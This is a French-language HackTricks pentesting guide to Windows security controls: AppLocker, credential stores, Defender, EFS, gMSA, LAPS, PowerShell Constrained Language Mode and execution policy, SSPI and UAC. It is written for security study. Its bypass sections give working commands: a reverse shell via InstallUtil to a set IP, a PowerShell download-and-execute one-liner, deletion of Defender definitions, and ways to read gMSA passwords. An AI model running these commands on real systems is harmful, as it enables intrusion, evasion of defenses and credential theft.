# Contrôles de sécurité Windows

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires **les plus avancés**.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Politique AppLocker

Une liste blanche d'applications est une liste de logiciels ou d'exécutables approuvés qui sont autorisés à être présents et à fonctionner sur un système. L'objectif est de protéger l'environnement contre les logiciels malveillants nuisibles et les logiciels non approuvés qui ne correspondent pas aux besoins spécifiques de l'organisation.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la **solution de liste blanche d'applications** de Microsoft et donne aux administrateurs système le contrôle sur **quelles applications et fichiers les utilisateurs peuvent exécuter**. Il offre un **contrôle granulaire** sur les exécutables, les scripts, les fichiers d'installation de Windows, les DLL, les applications empaquetées et les installateurs d'applications empaquetées.\
Il est courant pour les organisations de **bloquer cmd.exe et PowerShell.exe** et l'accès en écriture à certains répertoires, **mais tout cela peut être contourné**.

### Vérification

Vérifiez quels fichiers/extensions sont sur liste noire/liste blanche :
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Les règles AppLocker appliquées à un hôte peuvent également être **lues dans le registre local** à **`HKLM\Software\Policies\Microsoft\Windows\SrpV2`**.

### Contournement

* **Dossiers modifiables** utiles pour contourner la politique AppLocker : Si AppLocker autorise l'exécution de n'importe quoi dans `C:\Windows\System32` ou `C:\Windows`, il existe des **dossiers modifiables** que vous pouvez utiliser pour **contourner cela**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Les binaires [**"LOLBAS's"**](https://lolbas-project.github.io/) souvent **faisant confiance** peuvent également être utiles pour contourner AppLocker.
* **Des règles mal écrites pourraient également être contournées**
* Par exemple, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, vous pouvez créer un **dossier appelé `allowed`** n'importe où et il sera autorisé.
* Les organisations se concentrent souvent sur **le blocage de l'exécutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mais oublient les **autres** [**emplacements de l'exécutable PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) tels que `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
* **L'application de DLL est très rarement activée** en raison de la charge supplémentaire qu'elle peut imposer à un système, et de la quantité de tests nécessaires pour s'assurer que rien ne se cassera. Ainsi, utiliser **des DLL comme portes dérobées aidera à contourner AppLocker**.
* Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n'importe quel processus et contourner AppLocker. Pour plus d'informations, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Stockage des identifiants

### Security Accounts Manager (SAM)

Les identifiants locaux sont présents dans ce fichier, les mots de passe sont hachés.

### Local Security Authority (LSA) - LSASS

Les **identifiants** (hachés) sont **sauvegardés** dans la **mémoire** de ce sous-système pour des raisons de Single Sign-On.\
**LSA** administre la **politique de sécurité** locale (politique de mot de passe, permissions des utilisateurs...), **l'authentification**, **les jetons d'accès**...\
LSA sera celui qui **vérifiera** les identifiants fournis dans le fichier **SAM** (pour une connexion locale) et **communiquera** avec le **contrôleur de domaine** pour authentifier un utilisateur de domaine.

Les **identifiants** sont **sauvegardés** à l'intérieur du **processus LSASS** : billets Kerberos, hachages NT et LM, mots de passe facilement déchiffrables.

### Secrets LSA

LSA pourrait sauvegarder sur disque certains identifiants :

* Mot de passe du compte ordinateur de l'Active Directory (contrôleur de domaine inaccessible).
* Mots de passe des comptes des services Windows
* Mots de passe pour les tâches planifiées
* Plus (mot de passe des applications IIS...)

### NTDS.dit

C'est la base de données de l'Active Directory. Elle est uniquement présente dans les contrôleurs de domaine.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) est un antivirus disponible dans Windows 10 et Windows 11, ainsi que dans les versions de Windows Server. Il **bloque** les outils de pentesting courants tels que **`WinPEAS`**. Cependant, il existe des moyens de **contourner ces protections**.

### Vérification

Pour vérifier le **statut** de **Defender**, vous pouvez exécuter le cmdlet PS **`Get-MpComputerStatus`** (vérifiez la valeur de **`RealTimeProtectionEnabled`** pour savoir si elle est active) :

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Pour l'énumérer, vous pourriez également exécuter :
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS (Système de fichiers chiffrés)

EFS fonctionne en chiffrant un fichier avec une **clé symétrique** de masse, également connue sous le nom de clé de chiffrement de fichier, ou **FEK**. La FEK est ensuite **chiffrée** avec une **clé publique** associée à l'utilisateur qui a chiffré le fichier, et cette FEK chiffrée est stockée dans le flux de données **alternatif** $EFS du fichier chiffré. Pour déchiffrer le fichier, le pilote de composant EFS utilise la **clé privée** correspondant au certificat numérique EFS (utilisé pour chiffrer le fichier) pour déchiffrer la clé symétrique stockée dans le flux $EFS. Plus d'informations [ici](https://en.wikipedia.org/wiki/Encrypting_File_System).

Exemples de fichiers déchiffrés sans que l'utilisateur ne le demande :

* Les fichiers et dossiers sont déchiffrés avant d'être copiés sur un volume formaté avec un autre système de fichiers, comme [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table).
* Les fichiers chiffrés sont copiés sur le réseau en utilisant le protocole SMB/CIFS, les fichiers sont déchiffrés avant d'être envoyés sur le réseau.

Les fichiers chiffrés en utilisant cette méthode peuvent être **accessibles de manière transparente par l'utilisateur propriétaire** (celui qui les a chiffrés), donc si vous pouvez **devenir cet utilisateur**, vous pouvez déchiffrer les fichiers (changer le mot de passe de l'utilisateur et se connecter en tant que lui ne fonctionnera pas).

### Vérifier les infos EFS

Vérifiez si un **utilisateur** a **utilisé** ce **service** en vérifiant si ce chemin existe : `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Vérifiez **qui** a **accès** au fichier en utilisant cipher /c \<file>\
Vous pouvez également utiliser `cipher /e` et `cipher /d` dans un dossier pour **chiffrer** et **déchiffrer** tous les fichiers

### Déchiffrer les fichiers EFS

#### Être le système d'autorité

Cette méthode nécessite que l'**utilisateur victime** soit en train d'**exécuter** un **processus** sur l'hôte. Si c'est le cas, en utilisant une session `meterpreter`, vous pouvez usurper le jeton du processus de l'utilisateur (`impersonate_token` de `incognito`). Ou vous pourriez simplement `migrer` vers le processus de l'utilisateur.

#### Connaissant le mot de passe de l'utilisateur

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Comptes de service gérés par groupe (gMSA)

Dans la plupart des infrastructures, les comptes de service sont des comptes d'utilisateur typiques avec l'option "**Le mot de passe n'expire jamais**". La gestion de ces comptes peut être vraiment compliquée et c'est pourquoi Microsoft a introduit les **Comptes de service gérés :**

* Plus de gestion de mot de passe. Il utilise un mot de passe complexe et aléatoire de 240 caractères et le change automatiquement lorsque la date d'expiration du mot de passe du domaine ou de l'ordinateur est atteinte.
* Il utilise le Service de distribution de clés Microsoft (KDC) pour créer et gérer les mots de passe pour le gMSA.
* Il ne peut pas être verrouillé ou utilisé pour une connexion interactive
* Supporte le partage sur plusieurs hôtes
* Peut être utilisé pour exécuter des tâches planifiées (les comptes de service gérés ne prennent pas en charge l'exécution de tâches planifiées)
* Gestion simplifiée des SPN – Le système changera automatiquement la valeur du SPN si les détails de **sAMaccount** de l'ordinateur changent ou si la propriété du nom DNS change.

Les comptes gMSA ont leurs mots de passe stockés dans une propriété LDAP appelée _**msDS-ManagedPassword**_ qui est **réinitialisée automatiquement** par les DC tous les 30 jours, sont **récupérables** par les **administrateurs autorisés** et par les **serveurs** sur lesquels ils sont installés. _**msDS-ManagedPassword**_ est un blob de données chiffrées appelé [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) et il n'est récupérable que lorsque la connexion est sécurisée, **LDAPS** ou lorsque le type d'authentification est 'Sealing & Secure' par exemple.

![Image de https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Donc, si gMSA est utilisé, découvrez s'il a des **privilèges spéciaux** et vérifiez également si vous avez les **permissions** pour **lire** le mot de passe des services.

Vous pouvez lire ce mot de passe avec [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
Consultez également cette [page web](https://cube0x0.github.io/Relaying-for-gMSA/) sur la manière de réaliser une **attaque par relais NTLM** pour **lire** le **mot de passe** de **gMSA**.

## LAPS

[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) vous permet de **gérer le mot de passe de l'administrateur local** (qui est **randomisé**, unique et **changé régulièrement**) sur les ordinateurs joints au domaine. Ces mots de passe sont stockés de manière centralisée dans Active Directory et restreints aux utilisateurs autorisés à l'aide des ACL. Si votre utilisateur dispose des permissions suffisantes, vous pourriez être en mesure de lire les mots de passe des administrateurs locaux.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **limite de nombreuses fonctionnalités** nécessaires pour utiliser efficacement PowerShell, telles que le blocage des objets COM, l'autorisation uniquement des types .NET approuvés, les workflows basés sur XAML, les classes PowerShell, et plus encore.

### **Vérifier**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Contournement
```powershell
#Easy bypass
Powershell -version 2
```
Dans les versions actuelles de Windows, cette méthode de contournement ne fonctionnera pas, mais vous pouvez utiliser [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Pour le compiler, vous devrez peut-être** **ajouter une référence** -> _Parcourir_ -> _Parcourir_ -> ajouter `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` et **changer le projet en .Net4.5**.

#### Contournement direct :
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Shell inversé :
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n'importe quel processus et contourner le mode restreint. Pour plus d'informations, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Politique d'exécution PS

Par défaut, elle est définie sur **restricted.** Principales méthodes pour contourner cette politique :
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Plus d'informations [ici](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interface du fournisseur de support de sécurité (SSPI)

C'est l'API qui peut être utilisée pour authentifier les utilisateurs.

Le SSPI sera en charge de trouver le protocole adéquat pour deux machines qui veulent communiquer. La méthode préférée pour cela est Kerberos. Ensuite, le SSPI négociera quel protocole d'authentification sera utilisé, ces protocoles d'authentification sont appelés Fournisseur de support de sécurité (SSP), sont situés à l'intérieur de chaque machine Windows sous la forme d'une DLL et les deux machines doivent supporter le même pour pouvoir communiquer.

### Principaux SSPs

* **Kerberos** : Le préféré
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** et **NTLMv2** : Pour des raisons de compatibilité
* %windir%\Windows\System32\msv1\_0.dll
* **Digest** : Serveurs web et LDAP, mot de passe sous forme de hash MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel** : SSL et TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate** : Il est utilisé pour négocier le protocole à utiliser (Kerberos ou NTLM, Kerberos étant celui par défaut)
* %windir%\Windows\System32\lsasrv.dll

#### La négociation pourrait offrir plusieurs méthodes ou seulement une.

## UAC - Contrôle de compte d'utilisateur

[Contrôle de compte d'utilisateur (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui permet une **demande de consentement pour les activités élevées**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des workflows** facilement, alimentés par les outils communautaires **les plus avancés**.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
